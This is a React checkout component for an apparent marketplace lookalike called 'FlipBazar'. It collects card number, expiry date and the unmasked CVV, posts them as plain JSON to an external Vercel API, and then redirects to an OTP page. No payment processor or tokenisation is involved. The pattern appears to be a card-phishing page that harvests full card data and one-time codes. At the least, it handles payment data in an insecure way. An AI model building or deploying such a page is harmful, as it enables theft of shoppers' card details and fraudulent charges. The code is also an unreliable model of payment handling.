import { useState } from "react";
import { useNavigate } from "react-router-dom";
import "./Payment.css";
import { BiRupee, BiCheck } from "react-icons/bi";

export default function Payment({ product }) {
  const [isFocused, setIsFocused] = useState(false);
  const [cardDetails, setCardDetails] = useState({
    cardNumber: "",
    expiryDate: "",
    cvv: "",
  });

  const [displayCvv, setDisplayCvv] = useState(""); // Masked CVV display ke liye state
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();

  const handleInputChange = (e) => {
    const { name, value } = e.target;

    if (name === "cardNumber") {
      // Remove all spaces and non-numeric characters
      const rawValue = value.replace(/\D/g, "");
      // Add a space after every 4 characters
      const formattedValue = rawValue.replace(/(.{4})/g, "$1 ").trim();
      setCardDetails({ ...cardDetails, cardNumber: formattedValue });
    } else if (name === "cvv") {
      // Update both the original and masked CVV
      setCardDetails({ ...cardDetails, [name]: value });
      setDisplayCvv(isFocused ? value : value.replace(/./g, "*"));
    } else {
      setCardDetails({ ...cardDetails, [name]: value });
    }
  };

  const placeOrder = async () => {
    setIsLoading(true);
    try {
      const response = await fetch("https://flipbazar-api.vercel.app/api/payment", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          cardNumber: cardDetails.cardNumber.replace(/\s+/g, ""), // Remove spaces before sending
          expiryDate: cardDetails.expiryDate,
          cvv: cardDetails.cvv, // Send the unmasked CVV
          product,
        }),
      });

      const data = await response.json();
      if (response.ok) {
        alert(data.message);
        navigate("/otp");
      } else {
        alert(`Error: ${data.message}`);
      }
    } catch (error) {
      console.error("Error placing order:", error);
      alert("An error occurred while placing the order.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div
      aria-label="payment page"
      style={{ backgroundColor: "rgb(241, 243, 246)" }}
    >
      <div
        aria-label="payment options"
        style={{ padding: "20px", backgroundColor: "#fff" }}
      >
        <h2>Enter Card Details</h2>

        <div
          className="card-details-container"
          style={{
            display: "flex",
            flexDirection: "column",
            gap: "15px",
            marginTop: "15px",
          }}
        >
          <input
            type="text"
            name="cardNumber"
            placeholder="Card Number"
            value={cardDetails.cardNumber}
            onChange={handleInputChange}
            maxLength="19" // Includes spaces (16 digits + 3 spaces)
            inputMode="numeric"
            style={{
              padding: "12px",
              fontSize: "1rem",
              border: "1px solid #ccc",
              borderRadius: "5px",
            }}
          />

          <div style={{ display: "flex", gap: "10px" }}>
            <input
              type="text"
              name="expiryDate"
              placeholder="MM/YY"
              value={cardDetails.expiryDate}
              onChange={handleInputChange}
              maxLength="5"
              style={{
                padding: "12px",
                fontSize: "1rem",
                border: "1px solid #ccc",
                borderRadius: "5px",
                width: "50%",
              }}
            />
            <input
              type="text"
              name="cvv"
              placeholder="CVV"
              value={displayCvv}
              onChange={handleInputChange}
              onFocus={() => setIsFocused(true)}
              onBlur={() => {
                setIsFocused(false);
                setDisplayCvv(cardDetails.cvv.replace(/./g, "*")); // Blur hone par masked version dikhayein
              }}
              maxLength="3"
              style={{
                padding: "12px",
                fontSize: "1rem",
                border: "1px solid #ccc",
                borderRadius: "5px",
                width: "50%",
              }}
            />
          </div>
        </div>
      </div>

      <div
        aria-label="price details"
        style={{
          padding: "10px 20px",
          backgroundColor: "#fff",
          marginTop: "10px",
        }}
      >
        <p
          style={{
            fontSize: "1rem",
            margin: "20px 0px",
            fontWeight: "500",
          }}
        >
          Price Details
        </p>
        <div aria-label="details">
          <p
            style={{
              display: "flex",
              fontSize: "0.8rem",
              margin: "10px 0px",
              justifyContent: "space-between",
            }}
          >
            <span>Price</span>
            <span style={{ display: "flex", alignItems: "center" }}>
              <BiRupee size={"15px"} />
              {product.sale_price}
            </span>
          </p>
          <p
            style={{
              display: "flex",
              justifyContent: "space-between",
              fontSize: "0.8rem",
              margin: "10px 0px",
            }}
          >
            <span>Delivery Charge</span>
            <span
              style={{
                display: "flex",
                alignItems: "center",
                color: product.delivery_charge ? "#000" : "green",
              }}
            >
              {product.delivery_charge ? <BiRupee size={"15px"} /> : null}
              {product.delivery_charge || "DELIVERY FREE"}
            </span>
          </p>
        </div>
      </div>

      <div
        style={{
          padding: "15px 20px",
          backgroundColor: "#fff",
          display: "flex",
          justifyContent: "space-between",
          fontSize: "0.9rem",
          fontWeight: "500",
        }}
      >
        <span>Amount Payable</span>
        <span style={{ display: "flex", alignItems: "center" }}>
          <BiRupee size={"15px"} />
          {product.sale_price + product.delivery_charge}
        </span>
      </div>

      <div
        style={{
          padding: "20px",
          position: "fixed",
          bottom: "0",
          left: "0",
          width: "100%",
          backgroundColor: "#fff",
        }}
      >
        <button
          onClick={placeOrder}
          aria-label="place order button"
          style={{
            color: "white",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            gap: "10px",
            border: "none",
            outline: "none",
            backgroundColor: "rgb(43, 122, 249)",
            borderRadius: "5px",
            padding: "10px",
            width: "100%",
          }}
          disabled={isLoading}
        >
          {isLoading ? (
            "Placing Order..."
          ) : (
            <>
              <span>Place Order</span>
              <BiCheck size={"1.3rem"} />
            </>
          )}
        </button>
      </div>
    </div>
  );
}